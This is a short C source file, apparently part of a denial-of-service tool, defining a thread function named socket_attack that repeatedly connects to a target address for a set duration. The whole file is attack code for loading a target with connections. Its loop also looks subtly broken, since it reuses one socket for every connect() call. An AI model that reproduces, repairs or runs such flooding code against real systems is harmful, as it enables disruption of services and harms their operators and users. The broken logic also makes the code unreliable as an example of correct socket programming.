#include "headers/socket_attack.h"

void* socket_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    time_t end_time = time(NULL) + params->duration;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    while (params->active && time(NULL) < end_time) {
        int res = connect(sock, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
        if (res < 0) break;
    }
    close(sock);
    return NULL;
}
